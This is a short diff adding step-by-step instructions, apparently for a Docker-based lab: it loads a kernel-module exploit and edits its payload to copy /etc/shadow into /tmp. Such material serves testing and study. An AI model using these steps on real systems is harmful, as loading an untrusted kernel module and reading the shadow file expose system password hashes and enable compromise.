@@ -1,0 +1,24 @@
+1) Get the container id for the kernel container so we can add files:
+
+docker ps | grep kernel
+
+The container id will be the first field
+
+2) Tweak exploit.c by replacing '/bin/echo foo > /bar' with '/bin/cp /etc/shadow /tmp/'
+
+3) Copy over exploit.c and Makefile to the container
+
+docker cp exploit.c <container id>:/
+docker cp Makefile <container id>:/
+
+4) Exec into the container
+
+docker-compose exec kernel bash
+
+5) Compile module
+
+make
+
+6) Load module
+
+insmod exploit.ko
